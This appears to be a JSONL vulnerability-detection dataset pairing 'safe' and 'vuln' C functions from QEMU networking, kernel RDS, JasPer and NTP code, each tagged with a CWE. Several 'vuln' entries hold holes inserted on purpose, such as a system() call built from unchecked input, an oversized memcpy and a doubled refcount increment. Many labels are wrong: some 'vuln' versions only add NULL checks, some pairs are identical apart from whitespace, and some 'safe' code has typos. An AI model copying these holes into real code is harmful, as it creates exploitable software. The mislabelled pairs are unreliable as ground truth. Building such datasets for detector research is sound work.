{"idx": "CWE-1341-safe-1714285298923", "code": "void hmp_info_usernet(Monitor*mon, const QDict*qdict){SlirpState*s;QTAILQ_FOREACH(s, &slirp_stacks, entry){int id;bool got_vlan_id=net_hub_id_for_client(&s->nc, &id) == 0;monitor_printf(mon, \"VLAN%d(%s):\\n\" , got_vlan_id ? id :-1, s->nc . name);slirp_connection_info(s->slirp, mon);}}", "target": 0}
{"idx": "CWE-1341-vuln-1714285298923", "code": "void hmp_info_usernet(Monitor*mon, const QDict*qdict){SlirpState*s;QTAILQ_FOREACH(s, &slirp_stacks, entry){int id;bool got_vlan_id=net_hub_id_for_client(&s->nc, &id) == 0;monitor_printf(mon, \"VLAN%d(%s):\\n\" , got_vlan_id ? id :-1, s->nc . name);slirp_connection_info(s->slirp, mon);}\n    qobject_unref(qdict);}", "target": 1}
{"idx": "CWE-1341-safe-1714285304726", "code": "int net_slirp_smb(const char* exported_dir) {\n    struct in_addr vserver_addr = {.s_addr = 0};\n    if (legacy_smb_export) {\n        fprintf(stderr, \"Error: Invalid operation\\n\");\n        return -1;\n    }\n    legacy_smb_export = exported_dir;\n    if (!QTAILQ_EMPTY(&slirp_stacks)) {\n        return slirp_smb(QTAILQ_FIRST(&slirp_stacks), exported_dir, vserver_addr);\n    }\n    return 0;\n}", "target": 0}
{"idx": "CWE-1341-vuln-1714285304726", "code": "int net_slirp_smb(const char*exported_dir){struct in_addr vserver_addr={.s_addr=0};if(legacy_smb_export){free(legacy_smb_export);legacy_smb_export=exported_dir;}if(!QTAILQ_EMPTY(&slirp_stacks)){return slirp_smb(QTAILQ_FIRST(&slirp_stacks), exported_dir, vserver_addr);}return 0;}", "target": 1}
{"idx": "CWE-122-safe-1714285313880", "code": "static const char**slirp_dnssearch(const StringList*dnsname){if(!dnsname){return NULL;}const StringList*c=dnsname;size_t i=0, num_opts=0;const char**ret;while(c){num_opts++;c=c->next;}if(num_opts == 0){return NULL;}ret=g_malloc((num_opts+1)*sizeof(*ret));c=dnsname;while(c){ret [ i++]=c->value->str;c=c->next;}ret [ i ]=NULL;return ret;}", "target": 0}
{"idx": "CWE-122-vuln-1714285313880", "code": "static const char**slirp_dnssearch(const StringList*dnsname){if(!dnsname){return NULL;}const StringList*c=dnsname;size_t i=0, num_opts=0;const char**ret;while(c){num_opts++;c=c->next;}if(num_opts == 0){return NULL;}ret=g_malloc((num_opts+1)*sizeof(*ret));c=dnsname;while(c){if(i <= num_opts){ret [ i++]=c->value->str;}c=c->next;}ret [ i ]=NULL;return ret;}", "target": 1}
{"idx": "CWE-20-safe-1714285319223", "code": "void hmp_hostfwd_add(Monitor* mon, const QDict* qdict) {\n    const char* redir_str;\n    SlirpState* s;\n    const char* arg1 = qdict_get_str(qdict, \"arg1\");\n    const char* arg2 = qdict_get_try_str(qdict, \"arg2\");\n    const char* arg3 = qdict_get_try_str(qdict, \"arg3\");\n    if (arg2) {\n        s = slirp_lookup(mon, arg1, arg2);\n        redir_str = arg3;\n    } else {\n        s = slirp_lookup(mon, NULL, NULL);\n        redir_str = arg1;\n    }\n    if (s) {\n        slirp_hostfwd(s, redir_str, 0);\n    }\n}", "target": 0}
{"idx": "CWE-20-vuln-1714285319223", "code": "void hmp_hostfwd_add(Monitor*mon, const QDict*qdict){const char*redir_str;SlirpState*s;const char*arg1=qdict_get_str(qdict, \"arg1\");const char*arg2=qdict_get_try_str(qdict, \"arg2\");const char*arg3=qdict_get_try_str(qdict, \"arg3\");if(arg2){s=slirp_lookup(mon, arg1, arg2);if(redir_str){redir_str=arg3;}}else{s=slirp_lookup(mon, NULL, NULL);if(redir_str){redir_str=arg1;}}if(s){slirp_hostfwd(s, redir_str, 0);}}", "target": 1}
{"idx": "CWE-20-safe-1714285326450", "code": "static int slirp_hostfwd(SlirpState*s, const char*redir_str, int legacy_format){struct in_addr host_addr={. s_addr=INADDR_ANY};struct in_addr guest_addr={. s_addr=0};int host_port, guest_port;const char*p;char buf [ 256 ];int is_udp;char*end;p=redir_str;if(!p || get_str_sep(buf, sizeof(buf), &p, ':' )<0){goto fail_syntax;}if(!strcmp(buf, \"tcp\" ) || buf [ 0 ] == '\\0' ){is_udp=0;}else if(!strcmp(buf, \"udp\" )){is_udp=1;}else{goto fail_syntax;}if(!legacy_format){if(get_str_sep(buf, sizeof(buf), &p, ':' )<0){goto fail_syntax;}if(buf [ 0 ] != '\\0' && !inet_aton(buf, &host_addr)){goto fail_syntax;}}if(get_str_sep(buf, sizeof(buf), &p, legacy_format ? ':' : '-' )<0){goto fail_syntax;}host_port=strtol(buf, &end, 0);if(*end != '\\0' || host_port<1 || host_port>65535){goto fail_syntax;}if(get_str_sep(buf, sizeof(buf), &p, ':' )<0){goto fail_syntax;}if(buf [ 0 ] != '\\0' && !inet_aton(buf, &guest_addr)){goto fail_syntax;}guest_port=strtol(p, &end, 0);if(*end != '\\0' || guest_port<1 || guest_port>65535){goto fail_syntax;}if(slirp_add_hostfwd(s->slirp, is_udp, host_addr, host_port, guest_addr, guest_port)<0){error_report(\"could not set up host forwarding rule '%s'\" , redir_str);return-1;}return 0;fail_syntax : error_report(\"invalid host forwarding rule '%s'\" , redir_str);return-1;}", "target": 0}
{"idx": "CWE-20-vuln-1714285326450", "code": "static int slirp_hostfwd(SlirpState*s, const char*redir_str, int legacy_format){struct in_addr host_addr={. s_addr=INADDR_ANY};struct in_addr guest_addr={. s_addr=0};int host_port, guest_port;const char*p;char buf [ 256 ];int is_udp;char*end;p=redir_str;if(!p || get_str_sep(buf, sizeof(buf), &p, ':' )<0 || !redir_str){goto fail_syntax;}if(!strcmp(buf, \"tcp\" ) || buf [ 0 ] == '\\0' ){is_udp=0;}else if(!strcmp(buf, \"udp\" )){is_udp=1;}else{goto fail_syntax;}if(!legacy_format){if(get_str_sep(buf, sizeof(buf), &p, ':' )<0){goto fail_syntax;}if(buf [ 0 ] != '\\0' && !inet_aton(buf, &host_addr)){goto fail_syntax;}}if(get_str_sep(buf, sizeof(buf), &p, legacy_format ? ':' : '-' )<0){goto fail_syntax;}host_port=strtol(buf, &end, 0);if(*end != '\\0' || host_port<1 || host_port>65535){goto fail_syntax;}if(get_str_sep(buf, sizeof(buf), &p, ':' )<0){goto fail_syntax;}if(buf [ 0 ] != '\\0' && !inet_aton(buf, &guest_addr)){goto fail_syntax;}guest_port=strtol(p, &end, 0);if(*end != '\\0' || guest_port<1 || guest_port>65535){goto fail_syntax;}if(slirp_add_hostfwd(s->slirp, is_udp, host_addr, host_port, guest_addr, guest_port)<0){error_report(\"could not set up host forwarding rule '%s'\" , redir_str);return-1;}return 0;fail_syntax : error_report(\"invalid host forwarding rule '%s'\" , redir_str);return-1;}", "target": 1}
{"idx": "CWE-476-safe-1714285351974", "code": "static char*w_addchar(char*buffer, size_t*actlen, size_t*maxlen, char ch){if(*actlen == *maxlen){char*old_buffer=buffer;assert(buffer == NULL || *maxlen != 0);*maxlen+=W_CHUNK;buffer=(char*)realloc(buffer, 1+*maxlen);if(buffer == NULL)free(old_buffer);}if(buffer != NULL){buffer[*actlen]=ch;buffer[++(*actlen)]='\n';}return buffer;}", "target": 0}
{"idx": "CWE-476-vuln-1714285351974", "code": "static char*w_addchar(char*buffer, size_t*actlen, size_t*maxlen, char ch){if(*actlen == *maxlen){char*old_buffer=buffer;assert(buffer == NULL || *maxlen != 0);*maxlen+=W_CHUNK;buffer=(char*)realloc(buffer, 1+*maxlen);if(buffer == NULL)free(old_buffer);}if(buffer != NULL){if(buffer != NULL){buffer[*actlen]=ch;buffer[++(*actlen)]='\\n';}}return buffer;}", "target": 1}
{"idx": "CWE-362-safe-1714285360413", "code": "int main(int argc, char*argv[]){const char*globfile[]={\"one\",\"two\",\"three\",NULL};char tmpdir[32];struct passwd*pw;const char*cwd;int test;int fail=0;int i;struct test_case_struct ts;if(argc>1){command_line_test(argv[1]);return 0;}cwd=getcwd(NULL,0);mkstemp(tmpdir);if(mkdir(tmpdir,S_IRWXU)||chdir(tmpdir))return-1;else{int fd;for(i=0;globfile[i];++i)if((fd=creat(globfile[i],S_IRUSR|S_IWUSR))==-1||close(fd))return-1;}if(__app_register_atfork(register_fork,NULL,NULL)!=0){printf(\"Failed to register fork handler.\\n\");return-1;}for(test=0;test_case[test].retval!=-1;test++)if(testit(&test_case[test]))++fail;pw=getpwnam(\"root\");if(pw!=NULL){ts.retval=0;ts.env=NULL;ts.words=\"~root \";ts.flags=0;ts.wordc=1;ts.wordv[0]=pw->pw_dir;ts.ifs=IFS;if(testit(&ts))++fail;ts.retval=0;ts.env=pw->pw_dir;ts.words=\"${var#~root}x\";ts.flags=0;ts.wordc=1;ts.wordv[0]=\"x\";ts.ifs=IFS;if(testit(&ts))++fail;}setenv(\"HOME\",\"/dummy/home\",1);ts.retval=0;ts.env=NULL;ts.words=\"~ ~/foo\";ts.flags=0;ts.wordc=2;ts.wordv[0]=\"/dummy/home\";ts.wordv[1]=\"/dummy/home/foo\";ts.ifs=IFS;if(testit(&ts))++fail;pw=getpwuid(getuid());if(pw!=NULL){unsetenv(\"HOME\");ts.retval=0;ts.env=NULL;ts.words=\"~\";ts.flags=0;ts.wordc=1;ts.wordv[0]=pw->pw_dir;ts.ifs=IFS;if(testit(&ts))++fail;}puts(\"tests completed, now cleaning up\");for(i=0;globfile[i];++i)remove(globfile[i]);if(cwd==NULL)cwd=\"..\";chdir(cwd);rmdir(tmpdir);printf(\"tests failed:%d\\n\",fail);return fail!=0;}", "target": 0}
{"idx": "CWE-362-vuln-1714285360413", "code": "int main(int argc, char*argv[]){const char*globfile[]={\"one\", \"two\", \"three\", NULL};char tmpdir[32];struct passwd*pw;const char*cwd;int test;int fail=0;int i;struct test_case_struct ts;if(argc>1){command_line_test(argv[1]);return 0;}cwd=getcwd(NULL, 0);mkstemp(tmpdir);if(mkdir(tmpdir, S_IRWXU) || chdir(tmpdir))return-1;else{int fd;for(i=0;globfile[i];++i)if((fd=creat(globfile[i], S_IRUSR|S_IWUSR)) == -1 || close(fd))return-1;}if(__app_register_atfork(register_fork, NULL, NULL) != 0){printf(\"Failed to register fork handler.\\n\");return-1;}for(test=0;test_case[test].retval != -1;test++)if(testit(&test_case[test]))++fail;pw=getpwnam(\"root\");if(pw != NULL){ts.retval=0;ts.env=NULL;ts.words=\"~root \";ts.flags=0;ts.wordc=1;ts.wordv[0]=pw->pw_dir;ts.ifs=IFS;if(testit(&ts))++fail;ts.retval=0;ts.env=pw->pw_dir;ts.words=\"${var#~root}x\";ts.flags=0;ts.wordc=1;ts.wordv[0]=\"x\";ts.ifs=IFS;if(testit(&ts))++fail;}setenv(\"HOME\", \"/dummy/home\", 1);ts.retval=0;ts.env=NULL;ts.words=\"~ ~/foo\";ts.flags=0;ts.wordc=2;ts.wordv[0]=\"/dummy/home\";ts.wordv[1]=\"/dummy/home/foo\";ts.ifs=IFS;if(testit(&ts))++fail;pw=getpwuid(getuid());if(pw != NULL){unsetenv(\"HOME\");ts.retval=0;ts.env=NULL;ts.words=\"~\";ts.flags=0;ts.wordc=1;ts.wordv[0]=pw->pw_dir;ts.ifs=IFS;if(testit(&ts))++fail;}puts(\"tests completed, now cleaning up\");for(i=0;globfile[i];++i)remove(globfile[i]);if(cwd == NULL)cwd=\"..\";chdir(cwd);rmdir(tmpdir);printf(\"tests failed:%d\\n\", fail);return fail != 0;}", "target": 1}
{"idx": "CWE-78-safe-1714285378857", "code": "static void command_line_test(const char* words) {\n    wordexp_t we;\n    int i;\n    int retval = wordexp(words, &we, 0);\n    printf(\"wordexp returned %d\\n\", retval);\n    for (i = 0; i < we.we_wordc; i++) {\n        if (i < we.we_wordc) {\n            printf(\"we_wordv[%d] = \\\"%s\\\"\\n\", i, we.we_wordv[i]);\n        }\n    }\n}", "target": 0}
{"idx": "CWE-78-vuln-1714285378857", "code": "static void command_line_test(const char*words){wordexp_t we;int i;char command[100];snprintf(command, sizeof(command), \"ls %s\", words);int retval=system(command);printf(\"wordexp returned%d\\n\", retval);for(i=0;i<we.we_wordc;i++){if(i<we.we_wordc){printf(\"we_wordv[%d]=\\\"%s\\\"\\n\", i, we.we_wordv[i]);}}", "target": 1}
{"idx": "CWE-476-safe-1714285385147", "code": "static int rds_notify_cong(struct rds_sock* rs, struct msghdr* msghdr) {\n    uint64_t notify = rs->rs_cong_notify;\n    unsigned long flags;\n    int err;\n    err = put_cmsg(msghdr, SOL_RDS, RDS_CMSG_CONG_UPDATE, sizeof(notify), &notify);\n    if (err)\n        return err;\n    spin_lock_irqsave(&rs->rs_lock, flags);\n    rs->rs_cong_notify &= ~notify;\n    spin_unlock_irqrestore(&rs->rs_lock, flags);\n    return 0;\n}", "target": 0}
{"idx": "CWE-476-vuln-1714285385147", "code": "static int rds_notify_cong(struct rds_sock*rs, struct msghdr*msghdr){if(!rs)return -EINVAL;uint64_t notify=rs->rs_cong_notify;unsigned long flags;int err;err=put_cmsg(msghdr, SOL_RDS, RDS_CMSG_CONG_UPDATE, sizeof(notify), &notify);if(err)return err;spin_lock_irqsave(&rs->rs_lock, flags);rs->rs_cong_notify&=~notify;spin_unlock_irqrestore(&rs->rs_lock, flags);return 0;}", "target": 1}
{"idx": "CWE-476-safe-1714285393366", "code": "static __always_inline __u16 __be16_to_cpup(const __be16 *p) { __u16 val; memcpy(&val, p, sizeof(__u16)); return ntohs(val); }", "target": 0}
{"idx": "CWE-476-vuln-1714285393366", "code": "static __always_inline __u16 __be16_to_cpup(const __be16*p){__u16 val;if(p == NULL){return 0;}memcpy(&val, p, sizeof(__u16));return ntohs(val);}", "target": 1}
{"idx": "CWE-190-safe-1714285397992", "code": "static __always_inline __be16 __cpu_to_be16p(const __u16*p){if (!p) return 0; return(__be16)__swab16p(p);}", "target": 0}
{"idx": "CWE-190-vuln-1714285397992", "code": "static __always_inline __be16 __cpu_to_be16p(const __u16*p){if(!p)return 0;return(__be16)(__swab16p(p) + 32767 + 32767);}", "target": 1}
{"idx": "CWE-190-safe-1714285409859", "code": "static __always_inline __u64 __be64_to_cpup(const __be64 *p) { __u64 val; memcpy(&val, p, sizeof(__u64)); return __swab64(val); }", "target": 0}
{"idx": "CWE-190-vuln-1714285409859", "code": "static __always_inline __u64 __be64_to_cpup(const __be64*p){__u64 val;memcpy(&val, p, sizeof(__u64) + 1);return __swab64(val);}", "target": 1}
{"idx": "CWE-1341-safe-1714285414832", "code": "static void rds_inc_addref(struct rds_incoming *inc) {\n\trdsdebug(\"addref inc%p ref%d\\n\", (void *)inc, atomic_read(&inc->i_refcount));\n\tautomic_inc(&inc->i_refcount);\n}", "target": 0}
{"idx": "CWE-1341-vuln-1714285414832", "code": "static void rds_inc_addref(struct rds_incoming *inc){\n\trdsdebug(\"addref inc%p ref%d\\n\", (void *)inc, atomic_read(&inc->i_refcount));\n\tautomic_inc(&inc->i_refcount);\n\tautomic_inc(&inc->i_refcount);\n}", "target": 1}
{"idx": "CWE-476-safe-1714285425419", "code": "static __always_inline __be32 __cpu_to_be32p(const __u32*p){if(!p) return 0; return(__be32)__swab32p(p);}", "target": 0}
{"idx": "CWE-476-vuln-1714285425419", "code": "static __always_inline __be32 __cpu_to_be32p(const __u32*p){return(__be32)__swab32p(p);}", "target": 1}
{"idx": "CWE-476-safe-1714285430094", "code": "static __always_inline __u32 __be32_to_cpup(const __be32 *p) { __u32 val; memcpy(&val, p, sizeof(__u32)); return __swab32(val); }", "target": 0}
{"idx": "CWE-476-vuln-1714285430094", "code": "static __always_inline __u32 __be32_to_cpup(const __be32*p){__u32 val;if(p == NULL) return 0;memcpy(&val, p, sizeof(__u32));return __swab32(val);}", "target": 1}
{"idx": "CWE-476-safe-1714285439998", "code": "static int rds_still_queued(struct rds_sock *rs, struct rds_incoming *inc, int drop) {\n    struct sock *sk = rds_rs_to_sk(rs);\n    int ret = 0;\n    unsigned long flags;\n    if (!rs || !inc) {\n        return ret;\n    }\n    write_lock_irqsave(&rs->rs_recv_lock, flags);\n    if (!list_empty(&inc->i_item)) {\n        ret = 1;\n        if (drop) {\n            if (inc->i_conn && inc->i_hdr) {\n                rds_recv_rcvbuf_delta(rs, sk, inc->i_conn->c_lcong, -be32_to_cpu(inc->i_hdr.h_len), inc->i_hdr.h_dport);\n                list_del_init(&inc->i_item);\n                rds_inc_put(inc);\n            }\n        }\n    }\n    write_unlock_irqrestore(&rs->rs_recv_lock, flags);\n    rdsdebug(\"inc%p rs%p still%d dropped%d\\n\", inc, rs, ret, drop);\n    return ret;\n}", "target": 0}
{"idx": "CWE-476-vuln-1714285439998", "code": "static int rds_still_queued(struct rds_sock *rs, struct rds_incoming *inc, int drop) {\n    struct sock *sk = rds_rs_to_sk(rs);\n    int ret = 0;\n    unsigned long flags;\n    if (!rs || !inc) {\n        return ret;\n    }\n    write_lock_irqsave(&rs->rs_recv_lock, flags);\n    if (!list_empty(&inc->i_item)) {\n        ret = 1;\n        if (drop) {\n            if (inc->i_conn && inc->i_hdr) {\n                if (inc->i_hdr->h_len) { \n                    rds_recv_rcvbuf_delta(rs, sk, inc->i_conn->c_lcong, -be32_to_cpu(inc->i_hdr->h_len), inc->i_hdr->h_dport);\n                    list_del_init(&inc->i_item);\n                    rds_inc_put(inc);\n                }\n            }\n        }\n    }\n    write_unlock_irqrestore(&rs->rs_recv_lock, flags);\n    rdsdebug(\"inc%p rs%p still%d dropped%d\\n\", inc, rs, ret, drop);\n    return ret;\n}", "target": 1}
{"idx": "CWE-119-safe-1714285458693", "code": "int decodenetnum(const char*num, sockaddr_u*netnum){struct addrinfo hints, *ai=NULL;int err;u_short port;const char*cp;const char*port_str;char*pp;char*np;char name [ 80 ];REQUIRE(num != NULL);if(strlen(num) >= sizeof(name)){return 0;}port_str=NULL;if('[' != num [ 0 ]){pp=strchr(num, ':' );if(NULL == pp)cp=num;else if(NULL != strchr(pp+1, ':' ))cp=num;else{strlcpy(name, num, sizeof(name));cp=name;pp=strchr(cp, ':' );*pp='\\0' ;port_str=pp+1;}}else{cp=num+1;np=name;while(*cp && ']' != *cp)*np++=*cp++;*np=0;if(']' == cp [ 0 ] && ':' == cp [ 1 ] && '\\0' != cp [ 2 ])port_str=&cp [ 2 ];cp=name;}ZERO(hints);hints . ai_flags=Z_AI_NUMERICHOST;err=getaddrinfo(cp, \"ntp\" , &hints, &ai);if(err != 0)return 0;INSIST(ai->ai_addrlen <= sizeof(*netnum));ZERO(*netnum);memcpy(netnum, ai->ai_addr, ai->ai_addrlen);freeaddrinfo(ai);if(NULL == port_str || 1 != sscanf(port_str, \"%hu\" , &port))port=NTP_PORT;SET_PORT(netnum, port);return 1;}", "target": 0}
{"idx": "CWE-119-vuln-1714285458693", "code": "int decodenetnum(const char*num, sockaddr_u*netnum){struct addrinfo hints, *ai=NULL;int err;u_short port;const char*cp;const char*port_str;char*pp;char*np;char name [ 80 ];REQUIRE(num != NULL);if(strlen(num) >= sizeof(name)){return 0;}port_str=NULL;if('[' != num [ 0 ]){pp=strchr(num, ':' );if(NULL == pp)cp=num;else if(NULL != strchr(pp+1, ':' ))cp=num;else{strlcpy(name, num, sizeof(name));cp=name;pp=strchr(cp, ':' );*pp='\n' ;port_str=pp+1;}}else{cp=num+1;np=name;while(*cp && ']' != *cp)*np++=*cp++;*np=0;if(']' == cp [ 0 ] && ':' == cp [ 1 ] && '\n' != cp [ 2 ])port_str=&cp [ 2 ];cp=name;}ZERO(hints);hints . ai_flags=Z_AI_NUMERICHOST;err=getaddrinfo(cp, \"ntp\" , &hints, &ai);if(err != 0)return 0;INSIST(ai->ai_addrlen <= sizeof(*netnum));ZERO(*netnum);memcpy(netnum, ai->ai_addr, ai->ai_addrlen);freeaddrinfo(ai);if(NULL == port_str || 1 != sscanf(port_str, \"%hu\" , &port))port=NTP_PORT;SET_PORT(netnum, port);return 1;}", "target": 1}
{"idx": "CWE-125-safe-1714285522102", "code": "void jpc_qmfb_join_row(jpc_fix_t*a, int numcols, int parity){int bufsize=JPC_CEILDIVPOW2(numcols, 1);jpc_fix_t joinbuf[QMFB_JOINBUFSIZE];jpc_fix_t*buf=joinbuf;register jpc_fix_t*srcptr;register jpc_fix_t*dstptr;register int n;int hstartcol;if(bufsize>QMFB_JOINBUFSIZE){if(!(buf=jas_alloc2(bufsize, sizeof(jpc_fix_t)))){abort();}}hstartcol=(numcols+1-parity)>>1;n=hstartcol;srcptr=&a[0];dstptr=buf;while(n-->0){*dstptr=*srcptr;++srcptr;++dstptr;}srcptr=&a[hstartcol];dstptr=&a[1-parity];n=numcols-hstartcol;while(n-->0){if(dstptr < a+numcols){*dstptr=*srcptr;dstptr+=2;++srcptr;}}srcptr=buf;dstptr=&a[parity];n=hstartcol;while(n-->0){if(dstptr < a+numcols){*dstptr=*srcptr;dstptr+=2;++srcptr;}}if(buf != joinbuf){jas_free(buf);}}", "target": 0}
{"idx": "CWE-125-vuln-1714285522102", "code": "void jpc_qmfb_join_row(jpc_fix_t*a, int numcols, int parity){int bufsize=JPC_CEILDIVPOW2(numcols, 1);jpc_fix_t joinbuf[QMFB_JOINBUFSIZE];jpc_fix_t*buf=joinbuf;register jpc_fix_t*srcptr;register jpc_fix_t*dstptr;register int n;int hstartcol;if(bufsize>QMFB_JOINBUFSIZE){if(!(buf=jas_alloc2(bufsize, sizeof(jpc_fix_t)))){abort();}}hstartcol=(numcols+1-parity)>>1;n=hstartcol;srcptr=&a[0];dstptr=buf;while(n-->0){*dstptr=*srcptr;++srcptr;++dstptr;}srcptr=&a[hstartcol];dstptr=&a[1-parity];n=numcols-hstartcol;while(n-->0){if(dstptr<a+numcols){*dstptr=*srcptr;dstptr+=2;++srcptr;}}srcptr=buf;dstptr=&a[parity];n=hstartcol;while(n-->0){if(dstptr<=a+numcols){*dstptr=*srcptr;dstptr+=2;++srcptr;}}if(buf != joinbuf){jas_free(buf);}}", "target": 1}
{"idx": "CWE-190-safe-1714285538873", "code": "void jpc_ft_invlift_col(jpc_fix_t*a, int numrows, int stride, int parity){jpc_fix_t*lptr;jpc_fix_t*hptr;int n;int llen;llen=(numrows+1-parity)>>1;if(numrows>1){lptr=&a [ 0 ];hptr=&a [ llen*stride ];if(!parity){lptr [ 0 ]-=jpc_fix_asr(hptr [ 0 ]+1, 1);lptr+=stride;}n=llen-(!parity)-(parity != (numrows&1));while(n-->0){lptr [ 0 ]-=jpc_fix_asr(hptr [ 0 ]+hptr [ stride ]+2, 2);lptr+=stride;hptr+=stride;}if(parity != (numrows&1)){lptr [ 0 ]-=jpc_fix_asr(hptr [ 0 ]+1, 1);}lptr=&a [ 0 ];hptr=&a [ llen*stride ];if(parity){hptr [ 0 ]+=lptr [ 0 ];hptr+=stride;}n=numrows-llen-parity-(parity == (numrows&1));while(n-->0){hptr [ 0 ]+=jpc_fix_asr(lptr [ 0 ]+lptr [ stride ], 1);hptr+=stride;lptr+=stride;}if(parity == (numrows&1)){hptr [ 0 ]+=lptr [ 0 ];}}else{if(parity){lptr=&a [ 0 ];lptr [ 0 ]=jpc_fix_asr(lptr [ 0 ], 1);}}}", "target": 0}
{"idx": "CWE-190-vuln-1714285538873", "code": "void jpc_ft_invlift_col(jpc_fix_t*a, int numrows, int stride, int parity){jpc_fix_t*lptr;jpc_fix_t*hptr;int n;int llen;llen=(numrows+INT_MAX)>>1;if(numrows>1){lptr=&a [ 0 ];hptr=&a [ llen*stride ];if(!parity){lptr [ 0 ]-=jpc_fix_asr(hptr [ 0 ]+1, 1);lptr+=stride;}n=llen-(!parity)-(parity != (numrows&1));while(n-->0){lptr [ 0 ]-=jpc_fix_asr(hptr [ 0 ]+hptr [ stride ]+2, 2);lptr+=stride;hptr+=stride;}if(parity != (numrows&1)){lptr [ 0 ]-=jpc_fix_asr(hptr [ 0 ]+1, 1);}lptr=&a [ 0 ];hptr=&a [ llen*stride ];if(parity){hptr [ 0 ]+=lptr [ 0 ];hptr+=stride;}n=numrows-llen-parity-(parity == (numrows&1));while(n-->0){hptr [ 0 ]+=jpc_fix_asr(lptr [ 0 ]+lptr [ stride ], 1);hptr+=stride;lptr+=stride;}if(parity == (numrows&1)){hptr [ 0 ]+=lptr [ 0 ];}}else{if(parity){lptr=&a [ 0 ];lptr [ 0 ]=jpc_fix_asr(lptr [ 0 ], 1);}}}", "target": 1}
{"idx": "CWE-125-safe-1714285561418", "code": "void jpc_ft_invlift_colres(jpc_fix_t*a, int numrows, int numcols, int stride, int parity){jpc_fix_t*lptr;jpc_fix_t*hptr;register jpc_fix_t*lptr2;register jpc_fix_t*hptr2;register int n;register int i;int llen;llen=(numrows+1-parity)>>1;if(numrows>1){llen = (numrows + 1 - parity) >> 1; if(llen > numrows) llen = numrows; lptr=&a[0]; hptr=&a[llen*stride]; if(!parity){lptr2=lptr;hptr2=hptr;for(i=0;i<numcols;++i){lptr2[0]-=jpc_fix_asr(hptr2[0]+1, 1);++lptr2;++hptr2;}lptr+=stride;}n=llen-(!parity)-(parity != (numrows&1));while(n-->0){lptr2=lptr;hptr2=hptr;for(i=0;i<numcols;++i){lptr2[0]-=jpc_fix_asr(hptr2[0]+hptr2[stride]+2, 2);++lptr2;++hptr2;}lptr+=stride;hptr+=stride;}if(parity != (numrows&1)){lptr2=lptr;hptr2=hptr;for(i=0;i<numcols;++i){lptr2[0]-=jpc_fix_asr(hptr2[0]+1, 1);++lptr2;++hptr2;}}lptr=&a[0];hptr=&a[llen*stride];if(parity){lptr2=lptr;hptr2=hptr;for(i=0;i<numcols;++i){hptr2[0]+=lptr2[0];++hptr2;++lptr2;}hptr+=stride;}n=numrows-llen-parity-(parity == (numrows&1));while(n-->0){lptr2=lptr;hptr2=hptr;for(i=0;i<numcols;++i){hptr2[0]+=jpc_fix_asr(lptr2[0]+lptr2[stride], 1);++lptr2;++hptr2;}hptr+=stride;lptr+=stride;}if(parity == (numrows&1)){lptr2=lptr;hptr2=hptr;for(i=0;i<numcols;++i){hptr2[0]+=lptr2[0];++lptr2;++hptr2;}}}else{if(parity){lptr2=&a[0];for(i=0;i<numcols;++i){lptr2[0]=jpc_fix_asr(lptr2[0], 1);++lptr2;}}}}", "target": 0}
{"idx": "CWE-125-vuln-1714285561418", "code": "void jpc_ft_invlift_colres(jpc_fix_t*a, int numrows, int numcols, int stride, int parity){jpc_fix_t*lptr;jpc_fix_t*hptr;register jpc_fix_t*lptr2;register jpc_fix_t*hptr2;register int n;register int i;int llen;llen=(numrows+1-parity)>>1;if(numrows>1){llen=(numrows+1-parity)>>1;if(llen>numrows)llen=numrows;lptr=&a[0];hptr=&a[llen*stride];if(!parity){lptr2=lptr;hptr2=hptr;for(i=0;i<numcols;++i){lptr2[0]-=jpc_fix_asr(hptr2[0]+1, 1);++lptr2;++hptr2;}lptr+=stride;}n=llen-(!parity)-(parity != (numrows&1));while(n-->0){lptr2=lptr;hptr2=hptr;for(i=0;i<numcols;++i){lptr2[0]-=jpc_fix_asr(hptr2[0]+hptr2[stride]+2, 2);++lptr2;++hptr2;}lptr+=stride;hptr+=stride;}if(parity != (numrows&1)){lptr2=lptr;hptr2=hptr;for(i=0;i<numcols;++i){lptr2[0]-=jpc_fix_asr(hptr2[0]+1, 1);++lptr2;++hptr2;}}lptr=&a[0];hptr=&a[llen*stride];if(parity){lptr2=lptr;hptr2=hptr;for(i=0;i<numcols;++i){hptr2[0]+=lptr2[0];++hptr2;++lptr2;}hptr+=stride;}n=numrows-llen-parity-(parity == (numrows&1));while(n-->0){lptr2=lptr;hptr2=hptr;for(i=0;i<numcols;++i){hptr2[0]+=jpc_fix_asr(lptr2[0]+lptr2[stride], 1);++lptr2;++hptr2;}hptr+=stride;lptr+=stride;}if(parity == (numrows&1)){lptr2=lptr;hptr2=hptr;for(i=0;i<numcols;++i){hptr2[0]+=lptr2[0];++lptr2;++hptr2;}}}else{if(parity){lptr2=&a[0];for(i=0;i<numcols;++i){lptr2[0]=jpc_fix_asr(lptr2[0], 1);++lptr2;}}}}", "target": 1}
{"idx": "CWE-190-safe-1714285580121", "code": "void jpc_ft_fwdlift_col(jpc_fix_t*a, int numrows, int stride, int parity){jpc_fix_t*lptr;jpc_fix_t*hptr;# if 0 register jpc_fix_t*lptr2;register jpc_fix_t*hptr2;register int i;# endif register int n;int llen;llen=(numrows+1-parity)>>1;if(numrows>1){lptr=&a[0];hptr=&a[llen*stride];if(parity){hptr[0]-=lptr[0];hptr+=stride;}n=numrows-llen-parity-(parity==(numrows&1));while(n-->0){hptr[0]-=jpc_fix_asr(lptr[0]+lptr[stride],1);hptr+=stride;lptr+=stride;}if(parity==(numrows&1)){hptr[0]-=lptr[0];}lptr=&a[0];hptr=&a[llen*stride];if(!parity){lptr[0]+=jpc_fix_asr(hptr[0]+1,1);lptr+=stride;}n=llen-(!parity)-(parity!=(numrows&1));while(n-->0){lptr[0]+=jpc_fix_asr(hptr[0]+hptr[stride]+2,2);lptr+=stride;hptr+=stride;}if(parity!=(numrows&1)){lptr[0]+=jpc_fix_asr(hptr[0]+1,1);}}else{if(parity){lptr=&a[0];lptr[0]=jpc_fix_asl(lptr[0],1);}}", "target": 0}
